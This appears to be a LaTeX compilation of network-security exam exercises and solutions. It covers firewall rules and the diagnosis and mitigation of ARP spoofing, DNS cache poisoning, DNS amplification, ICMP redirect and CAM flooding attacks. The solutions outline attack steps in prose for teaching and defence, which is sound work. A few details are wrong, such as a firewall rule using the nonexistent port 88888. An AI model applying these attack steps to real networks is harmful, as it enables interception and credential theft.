\documentclass{article}
\usepackage[utf8]{inputenc}
\usepackage{hyperref}
\usepackage{amsmath}
\usepackage{graphicx}
\usepackage{listings}
\usepackage{xcolor}

\title{Computer Security Exercises and Solutions}
\author{Simone}
\date{\today}

\begin{document}

\maketitle
\tableofcontents

\newpage
\section{Network Security}
Exercises on firewall rules, VPNs, routing, and network-level attacks (e.g., ARP spoofing, DoS). Solutions generally involve analyzing network topology, packet flow, and protocol weaknesses.

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
Who has two thumbs and wants to improve the network design at Sacred Heart Hospital? Bob Kelso!... 5.1 Write the firewall rules... 5.2 Despite the recent network upgrades, the Janitor has bypassed security... 5.3 After some months, Dr. Cox finally decides to intervene... Is the attack adopted by the Janitor still doable? Is the attack still effective...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
5.1 Firewall rules: FW1 ANY ANY Int -> DMZ WS_IP 80 ALLOW Public to webserver; FW1 L_DNS_IP ANY DMZ -> Internet Auth. DNS 53 ALLOW Local DNS server to auth. one; FW1 ANY ANY ANY ANY ANY DENY Default deny; FW2 WS_IP ANY DMZ->BE_LAN AS_IP 80 ALLOW WebServer reaching backend; FW2 ANY ANY DN_LAN->DMZ L_DNS_IP 53 ALLOW D&N to local DNS; FW2 AS_IP ANY BE_LAN->DMZ L_DNS_IP 53 ALLOW AS reaching DNS; FW2 ANY ANY DN_LAN AS_IP 80 ALLOW D&N reaching AS; FW2 ANY ANY ANY ANY ANY DENY Default deny.

5.2 ARP cache poisoning. Assumptions: MAC addresses are not cached, Same LAN, ARP is not authenticated: first come, first trust. Attack Description: The Janitor wants to sniff the full conversation between JD and Turk, thus he needs to become a full-duplex man in the middle. Thus he needs to perform the very same attack twice, once against JD and the other against Turk. 1. On the first connection, JD sends a broadcast ARP request for Turk's MAC address. 2. The Janitor "wins the race" against Turk, replying with his own MAC address with a forged ARP reply. 3. JD trusts the first ARP reply -> The Janitor is half-duplex MITM. The very same attack is then performed against Turk. At the end the Janitor is full-duplex MITM. All the packets he intercepts are forwarded on to preserve the ongoing conversation.

5.3 ATTACK DOABILITY: The attack is still perfectly doable since it operates at the link layer of the stack, specifically abusing MAC addresses. Since they are still not cached and the Janitor still controls one doctor's workstation he can still put the attack in place. ATTACK EFFECTIVENESS: The attack is not effective anymore, since HTTPS encrypts the conversation. Thus, the Janitor can become a MITM (even full-duplex) but then he is not able to read the payload of the sniffed traffic.

### Improved Step-by-Step Explanation:
For 5.1: The firewall rules enforce the principle of least privilege. The WebServer (WS) in the DMZ must be accessible from the Internet on port 80. The Local DNS server in the DMZ needs to query Authoritative DNS servers on the Internet on port 53. Internal hosts (DN_LAN and BE_LAN) need to reach the Local DNS server in the DMZ. The WS needs to communicate with the Application Server (AS) in the BE_LAN. Doctors and Nurses (DN_LAN) need to reach the AS. All other traffic is denied by default.
For 5.2: The attack is ARP cache poisoning (ARP spoofing). Because ARP is stateless and unauthenticated, a device will accept an ARP reply even if it didn't send a request, and will generally overwrite existing cache entries. By sending spoofed ARP replies to both JD and Turk, claiming to have the IP address of the other party, the Janitor positions himself as a Man-in-the-Middle, intercepting and forwarding all traffic between them.
For 5.3: The transition to HTTPS does not prevent ARP spoofing because ARP operates at Layer 2 (Data Link Layer), while HTTPS operates at Layer 7 (Application Layer) over TCP/IP (Layers 4/3). The Janitor can still intercept the packets. However, HTTPS encrypts the application data using TLS. Without the session keys or the ability to trick the users into accepting a fraudulent certificate, the Janitor will only see encrypted ciphertext and cannot read the conversation payload.
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
Caltech University has finally allowed Dr. Sheldon Cooper to redesign... 1. [2 point] Write the firewall rules... 2. [2 points] Barry Kripke... managed to plug his laptop into the Office LAN. Kripke wants to intercept the confidential string theory research data... What attack can he carry out... Describe the assumptions and the steps... 3. [2 points] Wil Wheaton... intends to disrupt Sheldon's research... What attack can he carry out... Describe the assumptions and the steps...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
1. FW1 ANY ANY Int -> FWF_W 80 ALLOW Public access to FWF Web Server; FW1 ANY ANY Int -> DMZ DNS_RES 53 ALLOW Exposing DNS_RES to internet; FW1 DNS_RES ANY DMZ -> Int ANY 53 ALLOW DNS Resolver querying Authoritative Servers; FW1 Office ANY DMZ -> Int ANY 80 ALLOW Scientists accessing the Internet HTTP; FW1 Office ANY DMZ -> Int ANY 443 ALLOW Scientists accessing the Internet HTTPS; FW1 ANY ANY ANY ANY ANY DENY Default Deny; FW2 Office ANY Office -> DMZ DNS_RES 53 ALLOW Staff using local DNS; FW2 Howard IP ANY Office -> Lab ROVER 80 ALLOW Howard controlling Mars Rover; FW2 Office ANY Office -> DMZ ANY 80 ALLOW Staff accessing Internet/DMZ HTTP; FW2 Office ANY Office -> DMZ ANY 443 ALLOW Staff accessing Internet/DMZ HTTPS; FW2 ANY ANY ANY ANY ANY DENY Default Deny.
2. ARP Spoofing. Assumptions: 1. Kripke and Leonard are on the same LAN (Broadcast domain). 2. The switch routes traffic based on MAC addresses (CAM table) and lacks port security. 3. ARP messages are not authenticated. 4. All communications with the File Server are only HTTP. Attack description: 1. Poison Leonard's Cache: Kripke sends a forged ARP Reply to Leonard claiming: "The File Server's IP is at Kripke's MAC address". 2. Poison Gateway's Cache: Kripke sends a forged ARP Reply to the File Server claiming: "Leonard's IP is at Kripke's MAC address". 3. Forwarding (MITM): Kripke enables IP forwarding on his laptop. Now all packets between Leonard and the server pass through Kripke, allowing him to sniff the data.
3. DNS cache poisoning. Assumptions: 1. Recursive Resolver: The DNS_RES is a recursive resolver that caches results to optimize future queries. 2. Blind Attack: Since Wil Wheaton is external, he cannot sniff the traffic to see the Transaction ID. 3. Unauthenticated Protocol: The attack relies on DNS over UDP, making it vulnerable to spoofing. Attack Description: 1. Trigger: Wil Wheaton sends a query to the target DNS_RES asking for www.train-store.com to force it to perform a recursive lookup. 2. Flood/Guess: While DNS_RES is waiting for the legitimate response, Wil floods it with spoofed DNS responses pretending to come from the authoritative server. 3. Spoofing: These spoofed responses contain Wil's malicious IP address and guess the 16-bit Transaction ID. 4. Poison: If a spoofed packet with the correct ID arrives before the legitimate one, DNS_RES accepts it and caches the malicious IP. 5. When Sheldon later tries to visit the site, the poisoned cache redirects him to Wil's server.

### Improved Step-by-Step Explanation:
For 1: The firewall rules isolate the zones. FW1 protects the DMZ from the Internet and controls outbound traffic. FW2 protects the internal networks from the DMZ and isolates the Lab LAN from the Office LAN, permitting only Howard's IP to access the ROVER.
For 2: Since Kripke is on the same Office LAN as Leonard and the File Server, he is in the same broadcast domain. He can exploit the stateless nature of the Address Resolution Protocol (ARP) by sending unsolicited ARP replies (ARP Spoofing) to both Leonard and the File Server. By associating his own MAC address with their respective IP addresses, the switch will forward their traffic to Kripke's machine. Because the traffic is over HTTP (unencrypted), Kripke can read the confidential data in plaintext while acting as a Man-in-the-Middle.
For 3: Wil Wheaton is an external attacker, so he cannot perform MITM attacks on the internal network. Instead, he targets the DNS Resolver (DNS_RES) in the DMZ. He sends a legitimate request to resolve a domain, forcing the resolver to query an authoritative name server. Immediately, Wil floods the resolver with spoofed UDP response packets containing a malicious IP address. Since UDP is connectionless and unauthenticated, the resolver relies on a 16-bit Transaction ID to match responses to requests. By flooding the resolver with many guesses for the Transaction ID, Wil hopes one of his spoofed responses arrives before the legitimate response and matches the ID. If successful, the resolver caches the malicious IP, and subsequent internal requests for that domain will be redirected to Wil's malicious server.
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
Consider the network diagram describing a company’s network structure...
Consider also the following packet capture, observed at the company’s gateway when the employee... was accessing the website http://amazonia.it over HTTP (TCP port 80).
[Packet Capture Log]
1. [3 points] The company has noticed that while the employee at 10.44.19.4 was visiting http://www.amazonia.it, an attack took place over the network. Given the log above, can you identify the attack and give a brief explanation of how the specific instance attack that happened through the company’s network works? Please specify: The goal, the location in the network, and the addressing (i.e., IP, MAC) of the attacker.
2. [3 points] Describe (including any assumptions you need to make about the attack) how the attack can be mitigated, or avoided completely... What can you do if you are:
a) the administrator of the website www.amazonia.it
b) The administrator of the DNS server used by the network 10.44.19.0/24.
c) the network administrator of the network 10.44.19.0/24
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**1. Attack Identification:**
The attack is a **DNS Cache Poisoning** (or DNS Spoofing) attack. The log shows a massive flood of DNS responses originating from an external IP `210.32.133.1` directed at the Company DNS server, sequentially guessing the Transaction ID (0x01, 0x02... up to 0x992).
- **The goal**: The attacker aims to correctly guess the 16-bit Transaction ID (0x992) before the legitimate authoritative DNS server replies. If successful, the Company DNS server caches the malicious IP (`210.32.133.20`), meaning all subsequent traffic from the company bound for `www.amazonia.it` will be redirected to the attacker's server.
- **The location in the network**: The attacker is located externally on the Internet, as the spoofed packets are crossing the company gateway from the outside.
- **The addressing**: The attacker's IP sending the spoofed responses is `210.32.133.1`, and the payload points victims to `210.32.133.20`. The attacker's MAC address is fundamentally unknowable from the company's gateway capture, as MAC addresses are stripped and replaced at every router hop; the gateway only sees the MAC of the immediate upstream ISP router.

**2. Mitigations:**
**a) Website Administrator (www.amazonia.it):** Implement HTTPS and enforce it using HSTS (HTTP Strict Transport Security). Even if the DNS is poisoned, the attacker's server will not possess a valid TLS certificate for `www.amazonia.it`. The victim's browser will detect the certificate mismatch and securely terminate the connection. Additionally, deploy DNSSEC on the domain to allow recursive resolvers to cryptographically verify the integrity of the DNS records.
**b) Company DNS Server Administrator:** Implement Source Port Randomization for outgoing DNS queries. By randomizing both the UDP source port (16 bits) and the Transaction ID (16 bits), the total entropy increases to 32 bits, making blind guessing mathematically infeasible within the narrow time window. Furthermore, enable strict DNSSEC validation so unauthenticated spoofed responses are dropped.
**c) Company Network Administrator:** Configure the perimeter firewall/gateway to perform stateful inspection and rate-limiting. The firewall should block massive floods of unsolicited inbound UDP DNS responses from the Internet. An Intrusion Detection/Prevention System (IDS/IPS) should be tuned to detect the anomaly (thousands of mismatched DNS responses) and automatically block the attacking IP address (`210.32.133.1`).
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
A network topology diagram is provided with PCs, a Gateway, and the Internet. A sequence of packets is shown:
1. Source IP: 192.168.0.3, Dest IP: 192.168.0.1 (Gateway), Packet Type: ICMP echo request
2. Source IP: 192.168.0.1, Dest IP: 192.168.0.3, Packet Type: ICMP request Gateway 192.168.0.4
3. Source IP: 192.168.0.1, Dest IP: 192.168.0.3, Packet Type: ICMP request Gateway 192.168.0.1
4. Source IP: 192.168.0.1, Dest IP: 192.168.0.3, Packet Type: ICMP request Gateway 192.168.0.4
5. Source IP: 192.168.0.3, Dest IP: 164.124.65.5, Packet Type: HTTP request (Source MAC indicates it's sent to 192.168.0.4's MAC B4:C3:00:50:A4:F6)

1. [3 points] What kind of attack can be recognized from this sequence of packets? What is the goal of the attacker? What steps are required to perform the attack?
2. [1 point] What are the IP addresses of the attacker and of the victim?
3. [2 points] Is it possible to detect this attack while it is happening? If yes, how?
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
### Question 1: Attack Identification

-   **Attack Type:** This is an **ICMP Redirect attack**.
-   **Attacker's Goal:** The primary objective is to execute a **Man-in-the-Middle (MitM)** attack. By redirecting the victim's traffic through their own machine, the attacker can intercept, read, or modify the data flowing between the victim and the Internet.
-   **Steps Required:**
    1.  The attacker monitors the network to identify a victim (`192.168.0.3`) sending traffic to the legitimate default gateway (`192.168.0.1`).
    2.  The attacker crafts malicious ICMP Redirect messages (Type 5). These packets must be spoofed to appear as if they originated from the legitimate gateway (`192.168.0.1`).
    3.  The payload of these ICMP Redirect messages instructs the victim to update its routing table, pointing to the attacker's machine (`192.168.0.4`) as the new, optimal gateway for Internet-bound traffic.
    4.  Once the victim updates its routing table, subsequent packets intended for the Internet are sent to the attacker's MAC address instead of the real gateway.

### Question 2: Identifying Attacker and Victim

-   **Victim IP:** `192.168.0.3`. This machine is the recipient of the spoofed ICMP Redirect messages and is the one whose HTTP traffic is successfully diverted to the wrong MAC address.
-   **Attacker IP:** `192.168.0.4`. The ICMP Redirect messages explicitly tell the victim to use `192.168.0.4` as the new gateway. The attacker controls this IP to act as the MitM proxy.

### Question 3: Detection and Mitigation

-   **Is it detectable?** Yes, this specific instance is highly detectable.
-   **How to detect:** A normal ICMP Redirect occurs rarely. In the provided logs, we see multiple ICMP Redirect packets (Packets 2, 3, and 4) arriving immediately after a single standard outbound packet. This rapid succession of redirects is anomalous and a strong indicator of spoofing.
-   **Mitigation Strategy:**
    -   **Host-Level Defense:** Configure the operating system to ignore ICMP Redirect messages entirely.
    -   **Network-Level Defense:** Implement an IDS/IPS rule: if a host receives multiple conflicting ICMP Redirects in a short timeframe, log an alert and drop the suspicious packets.
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
ZenTech Corporation network layout... Write the firewalls rules... The company would like to enable the employees to work from home... Lately, employees... reported sluggish network performance and stolen credentials. Log analysis...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Firewall Rules Configuration**
To secure the network zones:
1. Deny everything by default (`ALL ANY ALL ALL ANY DENY`).
2. Allow PCs in `PC_Z` to access the DMZ and the Internet (`PCs IPs ALL PC_Z->DMZ ALL ALL ALLOW`, `PCs IPs ALL DMZ->Internet ALL ALL ALLOW`).
3. Allow the Intranet Server to access the Application Server on its specific port (`Intranet Sv IP 88888 DMZ->SV_Z Application Server 88888 ALLOW`).

**Step 2: Securing Remote Work**
To provide home employees with secure access equivalent to being in the office:
- **Solution**: Implement a Full Tunnel VPN Server located in the `PC_Z` subnetwork. 
- **Justification**: A full tunnel VPN routes *all* of the remote laptop's internet traffic through the company's network. Since employees are restricted to work-related tasks and bandwidth is not an issue, this ensures consistent security policy enforcement (firewalls, IDS/IPS) on all traffic, unlike a split-tunnel VPN where local internet traffic bypasses corporate defenses.
- **Adjustments**: The border firewall (FW1) and internal firewall (FW2) need a rule allowing external traffic to reach the VPN server's specific port (e.g., UDP 1194 for OpenVPN).

**Step 3: Analyzing LAN Logs (ARP Spoofing)**
- **Log Observation**: The logs show IP `192.168.1.5` (PC2) claiming to be the Gateway (`192.168.1.1`) to `192.168.1.7` (PC4), and vice versa via gratuitous ARP replies. Subsequent HTTP traffic between PC4 and the Gateway routes through `00:0A:BC:12:34:56` (PC2's MAC address).
- **Attack Identification**: This is a classic ARP Poisoning (Man-in-the-Middle) attack. ARP is a stateless, unauthenticated protocol. The attacker (PC2) sends spoofed ARP messages to bind their MAC address to the IP addresses of the victim and the gateway.
- **Impact**: All traffic between the victim and the internet flows through the attacker, allowing them to sniff credentials and read plaintext HTTP traffic.
- **Mitigation**: Implement HTTPS across the intranet to ensure traffic is encrypted. Even if the attacker intercepts the packets via ARP spoofing, they will not be able to read or tamper with the payload without triggering certificate errors on the victim's machine.
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
CodeCraft network diagram and packet capture... Identify the ongoing attack and explain how it works... Who is the victim?...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying the Attack from PCAPs**
- **Observation**: The packet capture shows a query for `stats.acme.com` to the local DNS server (`192.168.1.253`). Immediately after, a massive flood of unsolicited DNS responses from an external IP (`23.93.121.244`) arrives, all claiming `stats.acme.com` is at `66.117.117.117`.
- **Attack Identification**: This is a **DNS Cache Poisoning (DNS Spoofing)** attack.
- **How it works**: The attacker triggers a DNS query on the local network. Before the legitimate authoritative DNS server can reply, the attacker floods the local DNS server with fake responses containing forged Transaction IDs. If the attacker correctly guesses the 16-bit Transaction ID, the local DNS server accepts the fake record and caches it.

**Step 2: Identifying the Victim**
- **Victim**: The immediate victim is the Local DNS Server (`192.168.1.253`), whose cache is being poisoned. The downstream victims are any machines relying on this server. In the logs, `192.168.1.7` connects to the malicious IP (`66.117.117.117`), making it the successful target of the redirect.
- **Attacker Profile**: The attacker is spoofing the source IP to look like an authoritative DNS server, but the attack originates from inside the network (connected to switch SW1) to ensure the timing of the flood beats the legitimate internet response.

**Step 3: Mitigation Strategies**
- **Firewall Fix**: A stateful firewall can block incoming DNS responses that do not match an established outgoing DNS query. However, this just shifts the burden to the firewall, which could be overwhelmed by the flood (DoS).
- **Protocol Fix**: Forcing DNS over TCP mitigates the attack. TCP requires a 3-way handshake. The attacker cannot easily spoof the source IP *and* guess the TCP sequence numbers required to establish a valid connection to deliver the poisoned payload.
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
DNS protocol... DoS attack based on amplification factors... analyze packet capture...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying the Amplification Vulnerability**
- **Mechanism**: The DNS protocol primarily uses UDP, a connectionless protocol that does not verify source IPs. An attacker can send a tiny DNS request (e.g., 50 bytes) asking for *all* available records (`ANY`). The Authoritative DNS server complies and sends a massive response (e.g., 2000+ bytes).
- **Exploitation (DNS Amplification DoS)**: The attacker spoofs their IP address, making the request appear as if it came from the victim. The DNS server sends the massively amplified response to the victim. By leveraging a botnet to send thousands of these spoofed requests, the attacker drowns the victim's network in gigabytes of unwanted DNS responses, causing a Denial of Service.

**Step 2: Analyzing the Packet Capture**
- **Observation**: The logs show packets originating from `86.86.230.18` (port 53, DNS) heading to `105.5.1.230`, with lengths exceeding 2400 bytes.
- **Identification**: 
  - **Attacker**: Not present in these specific logs, because the attacker's packets were sent to the DNS server, not the victim.
  - **Victim**: `105.5.1.230` is the victim receiving the flood of unwanted traffic.
  - **Server**: `86.86.230.18` is an Authoritative DNS server being unwillingly utilized as an "amplifier" by the attacker. 

**Step 3: Mitigation Strategies**
- **As the Victim Admin**: You can implement a stateful firewall that drops inbound DNS responses that don't match outbound DNS requests. However, the traffic still consumes bandwidth hitting the firewall, meaning upstream ISP mitigation is required to truly stop the DoS.
- **As the DNS Server Admin**: Disable the `ANY` query feature, or implement Response Rate Limiting (RRL) to throttle identical large responses to the same IP.
- **Protocol Shift**: Migrating DNS to TCP eliminates this attack. TCP's 3-way handshake prevents IP spoofing because the attacker cannot complete the handshake on behalf of the victim, meaning the amplified response is never sent.
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
PixelPerfect startup network... Firewall rules... CAM Flooding attack + ARP Spoofing attack...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Firewall Rules Configuration**
- To secure the network appropriately:
  1. Deny everything by default to establish a baseline of security (`ALL ANY ALL ALL ANY DENY`).
  2. Allow external internet traffic to access the Web Server on standard HTTP/HTTPS ports (`ANY ANY INT->LOCAL WS_IP 80/443 ALLOW`).
  3. Allow internal workstations (`PC*`) full outgoing access to the internet (`PC* ANY LOCAL->INT ANY ANY ALLOW`).

**Step 2: Analyzing the Attack (CAM Flooding + ARP Spoofing)**
- **Observation**: The switch logs show thousands of packets arriving at the switch, all originating from rapidly changing, random, bogus MAC addresses (e.g., `00:00:00:00:00:AA`, `...BB`). 
- **Identification**: This is a **CAM Table Flooding Attack**. Switches keep a memory table (CAM table) mapping MAC addresses to physical ports. The attacker floods the switch with fake MAC addresses to exhaust this memory.
- **Result**: Once the CAM table is full, the switch fails open, acting like a dumb hub. It begins broadcasting all incoming traffic out of *every* port. This allows the attacker to sniff traffic not meant for them (e.g., database SQL queries).
- **Goal**: The attacker is sniffing the network to steal sensitive data from the database communications.

**Step 3: Network Mitigation**
- **Switch Fix**: Implement **Port Security** (e.g., Cisco Port Security) on the switch. This feature limits the number of unique MAC addresses allowed on a single physical port. If the threshold is exceeded, the switch port automatically shuts down, instantly neutralizing the CAM flood.
- **Architecture Fix**: Redesign the network to include a **DMZ (Demilitarized Zone)**. Move the public-facing Web Server into the DMZ, isolated by firewalls from both the internet and the internal LAN. Place the Application Server and Database in a secure internal subnet. This ensures that even if the Web Server is compromised, the attacker cannot freely sniff or attack the internal database traffic.
\end{verbatim}

\subsection{Exercise 5 - Network Security (6 points)}
\subsubsection*{Problem}
\begin{verbatim}
SharedCars is a new car-sharing company... [Network diagram with PCs, DB, WS, AS, Internet, FW1]
1. [1 points] Write the firewall rules, assuming the firewall to be a stateful packet filter.
2. [2 points] SharedCars is under attack. Users noticed their data was stolen after registering for this service, and the company called you to investigate... You open your network analysis tools and find this sequence of packages captured by PC1: [MAC floods]. Going through the logs of the switch, you notice that these packets come from the port associated to the web server. You also notice this particular packet sequence: [ARP poisoning & SQL queries]. What attack(s) is(are) going on? Who is the attacker? What is their goal?
3. [1 point] Can you mitigate the attack(s) by acting on the network switch only? If yes, how?
4. [2 points] SharedCars asks you to solve the problem. You can modify the network layout as you like and add the necessary firewall rules. Draw the network in a clear way, justify your answer, and write the new firewall rules in the table below.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Firewall Rules Configuration.**
A stateful firewall tracks active connections. We only need to allow the *first packet* (the request); the firewall will automatically allow the corresponding replies.
Given the requirements:
1.  **Internet to Web Server (WS):** External users (Internet) need to reach the Web Server on ports 80 (HTTP) and 443 (HTTPS).
    `Internet -> WS_IP, Dst Port: 80/443, ALLOW`
2.  **Employees to Internet:** Employees (`PC_IPs` or internal subnet) need standard internet access.
    `Internal_Subnet -> ANY, ALLOW`
3.  **Web Server to Application Server (AS):** The WS needs to talk to the AS to process logic.
    `WS_IP -> AS_IP, ALLOW`
4.  **Application Server to Database (DB):** The AS needs to fetch/store data in the DB.
    `AS_IP -> DB_IP, ALLOW`
5.  **Default Deny:** Block everything else not explicitly permitted.
    `ANY -> ANY, DENY`

**Step 2: Analyzing the Network Logs (Identifying the Attack).**
Let's examine the first packet capture (PC1's perspective):
We see a huge flood of random packets with different spoofed source MAC addresses (`SrcMAC`) and IP addresses. For example: `5f:f7:b9...`, `04:14:33...`. This is a classic signature of a **CAM Table Flooding attack**.
A switch uses a CAM table to map MAC addresses to physical switch ports. If an attacker floods the switch with thousands of fake MAC addresses, the CAM table fills up. When the table is full, the switch doesn't know where to send incoming packets, so it "fails open" and broadcasts all packets to all ports (acting like a dumb hub). This allows PC1 (the attacker) to sniff traffic meant for other machines.
Let's examine the second log (Switch logs showing traffic from the Web Server port):
We see ARP requests and responses. The Web Server (`192.168.0.50`) and another machine (`192.168.0.51`, likely the AS or DB) are communicating. The attacker, having turned the switch into a hub via CAM flooding, is now observing `SQLquery` and `SQLresp` packets.
Notice the `SrcMAC` is sometimes spoofed or the attacker's MAC. The prompt's solution indicates **ARP Spoofing**. In ARP spoofing, the attacker sends fake ARP messages to associate their MAC address with the IP address of a legitimate server (e.g., the DB). This allows them to intercept the SQL queries in a Man-in-the-Middle attack.
**Attacker:** The attacker is someone who has compromised the Web Server (since the malicious ARP/flooding traffic comes from the switch port connected to the Web Server).
**Goal:** Intercept the communication between the Application/Web Server and the Database to steal sensitive user data.

**Step 3: Switch-level Mitigation.**
To stop CAM flooding and ARP spoofing at the switch level, we can use features like **Port Security**. Port Security restricts a switch port to only allow a specific MAC address (or a small, fixed number of MAC addresses) to communicate through it. If it detects a flood of new MAC addresses, it will drop the packets or shut down the port, completely neutralizing the CAM flooding attack. Dynamic ARP Inspection (DAI) can also be enabled to validate ARP packets against a trusted database, preventing ARP spoofing.

**Step 4: Network Architecture Redesign.**
The fundamental flaw in the current layout is that the Web Server, Application Server, Database, and employee PCs are all on the same flat internal network. If the Web Server (which is exposed to the Internet and highly vulnerable) is compromised, the attacker has unrestricted lateral access to the Database and internal PCs.
**The Solution:** Implement a **DMZ (Demilitarized Zone)**.
1.  Place the Web Server in a dedicated subnetwork (the DMZ). The firewall sits between the Internet, the DMZ, and the Internal Network.
2.  Place the Application Server and Database in a secure Internal Network segment.
3.  Place employee PCs in a separate Office Network segment.
**New Firewall Rules:**
-   `Internet -> DMZ (Web Server): ALLOW HTTP/HTTPS`
-   `DMZ (Web Server) -> Internal (App Server): ALLOW specific API ports`
-   `DMZ -> Internal (Database): DENY` (The WS must never talk directly to the DB, only through the AS).
-   `Internal (App Server) -> Internal (Database): ALLOW SQL port`
This compartmentalization ensures that even if the Web Server is fully compromised, the attacker cannot simply ARP spoof the Database or access employee machines directly; they are blocked by the strict firewall rules between the DMZ and the internal networks.
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
Eat&Play is a new gaming bar that wants to offer a high-quality gaming experience to its customers at a reasonable price. They allow users to book timeslots and assign each user a username and password to access their PCs. The network layout is schematized in the picture: Switch A connects the Web Server, App Server, DB Server, DNS Server, Gateway, Switch B (User PCs: 192.0.0.1-99), and Switch C (Employee PCs: 192.0.0.100-200).
One day, a user complained that their credit card information had been stolen after one of their gaming sessions. The system administrator investigates logs of switch A and finds a suspicious sequence of packets (DNS query for buyvbucks.com, rapid spoofed DNS responses pointing to 192.0.0.6, followed by the legitimate response arriving late).

1. [1 point] Can you identify what is going on? State the name of the attack and how it works.
2. [1 point] Who is the attacker? Can their IP be spoofed? Who is the victim?
3. [3 points] To prevent this accident from happening again, the owner of Eat&Play hired you as a security consultant to modify the network layout by inserting a firewall. You have to choose where to insert it: you can remove one of the switches and replace it with a firewall. Where would you place the firewall? Write the firewall rules you deem necessary, making them consistent with your choice and assuming you are working with a stateful packet filter.
4. [1 point] Is there another way the attacker could obtain the same result? If yes, how? If not, why?
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step-by-Step Pedagogical Solution:**

**Question 1: Attack Identification**
*Name*: **DNS Cache Poisoning** (or DNS Spoofing).
*How it works*: When the internal client queries the internal DNS server for `www.buyvbucks.com`, the internal DNS server recursively asks the external authoritative server. The attacker races to flood the internal DNS server with forged responses before the legitimate authoritative server can reply. By successfully guessing the DNS transaction ID and source port, the internal server accepts the fake response, caches the malicious IP mapping (`192.0.0.6`), and serves it to the victim, hijacking their web traffic to a phishing site.

**Question 2: Attacker and Victim Identities**
- **Attacker**: The malicious payload redirects traffic to `192.0.0.6`. Based on the network subnetting, this IP belongs to the User PCs pool. Therefore, the attacker is **a customer** operating one of the internal gaming PCs. 
- **Can their IP be spoofed?**: While the external flooding traffic might have a spoofed source IP, the malicious destination IP `192.0.0.6` where the HTTPS connection is directed **cannot be spoofed**. To successfully serve the phishing page over HTTPS, the attacker must complete a full 3-way TCP handshake, requiring real bi-directional communication.
- **Victim**: The customer using PC `192.0.0.2` who initiated the request to buy V-Bucks.

**Question 3: Firewall Placement and Rules**
*Placement*: **Switch A** should be replaced by a Firewall. This acts as the central hub, allowing us to enforce network segmentation between distinct security zones (Users, Employees, Servers, Internet).

*Firewall Rules Strategy (Default Deny)*:
1. `FW1 | Src: all | Dst: Server_Z | Dst Port: 80/443 | Action: Allow` (Allow connection to webserver)
2. `FW1 | Src: User_IP | Dst: Server_Z DNS_IP | Dst Port: 53 | Action: Allow` (Allow DNS requests for users)
3. `FW1 | Src: Employee_IP | Dst: Server_Z DNS_IP | Dst Port: 53 | Action: Allow` (Allow DNS requests for employees)
4. `FW1 | Src: Employee_IP | Dst: Server_Z WS_IP | Dst Port: 80/443 | Action: Allow` (Allow admin access to internal web servers)
5. `FW1 | Src: User_IP | Dst: Internet | Dst Port: any 80/443 | Action: Allow` (Enable internet connection for users)
6. `FW1 | Src: Employee_IP | Dst: Internet | Dst Port: any 80/443 | Action: Allow` (Enable internet connection for employees)
7. `FW1 | Src: Employee_IP | Dst: Server_Z | Dst Port: 22 | Action: Allow` (Enable SSH connection to servers for employees)
8. `FW1 | Src: all | Dst: all | Dst Port: all | Action: Deny` (**Default Deny**)

**Question 4: Alternative Attack Vectors**
*Mechanism*: Yes, the attacker could use **ARP Poisoning (ARP Spoofing)**. Because the attacker and victim are on the same local subnet (connected to Switch B), the attacker can broadcast fake ARP messages to associate their MAC address with the IP address of the Gateway or DNS Server. This redirects the victim's traffic directly to the attacker at Layer 2 without needing to poison the central DNS server, bypassing the Switch A firewall entirely.
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
A hotel provides computers for its guests. A guest reported their credentials stolen. Network logs from the victim's machine (IP: 10.0.0.2) show the following packets:
1. Source: 10.0.0.2 (MAC: d1:...:c8) -> Dest: 10.0.0.1 (MAC: 52:...:12), Type: ICMP echo request
2. Source: 10.0.0.1 (MAC: bc:...:1d) -> Dest: 10.0.0.2 (MAC: d1:...:c8), Type: ICMP Redirect, Gateway: 10.0.0.8
3. Source: 10.0.0.1 (MAC: 52:...:12) -> Dest: 10.0.0.2 (MAC: d1:...:c8), Type: ICMP Redirect, Gateway: 10.0.0.1
4. Source: 10.0.0.1 (MAC: bc:...:1d) -> Dest: 10.0.0.2 (MAC: d1:...:c8), Type: ICMP Redirect, Gateway: 10.0.0.8
5. Source: 10.0.0.2 (MAC: d1:...:c8) -> Dest: 171.28.64.2 (MAC: bc:...:1d), Type: HTTP request

1. [3 points] What kind of attack can be recognized from this sequence of packets? What is the goal of the attacker? What steps are required to perform the attack?
2. [1 point] What are the attacker and victim IP addresses?
3. [2 points] How can the victim detect this attack? Can it be mitigated? If yes, how?
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
### 1. Attack Identification
**Step-by-Step Reasoning:**
- Looking at the packet types, we observe multiple `ICMP Redirect` messages. 
- ICMP Redirects are legitimate network messages used by routers to inform hosts of a more optimal route to a destination.
- However, packet 2 shows a redirect claiming to come from the legitimate gateway `10.0.0.1`, but its MAC address (`bc:...:1d`) does not match the real gateway's MAC address (`52:...:12` seen in packet 1). This is IP spoofing.
- **Attack Type:** ICMP Redirect Spoofing (a form of Man-in-the-Middle / MitM).
